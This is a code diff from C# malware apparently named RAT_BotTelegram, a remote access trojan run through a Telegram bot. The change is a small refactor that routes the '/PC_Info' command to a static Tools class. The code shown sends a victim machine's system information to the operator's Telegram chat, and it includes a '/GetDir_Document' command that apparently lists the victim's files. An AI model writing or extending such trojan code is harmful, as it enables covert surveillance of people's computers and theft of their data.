@@ -11,7 +11,6 @@ using Telegram.Bot.Types.ReplyMarkups;
 
 namespace RAT_BotTelegram {
     class Program {
-        static CommandsFeatures fea = new CommandsFeatures();
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TToken);
         // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
@@ -46,7 +45,7 @@ namespace RAT_BotTelegram {
             switch (message.Text.Split(' ').First()) {
                 //Enviar un inline keyboard con callback
                 case "/PC_Info":
-                    await Bot.SendTextMessageAsync(config.id, fea.PC_Info());
+                    await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
 
                 case "/GetDir_Document":
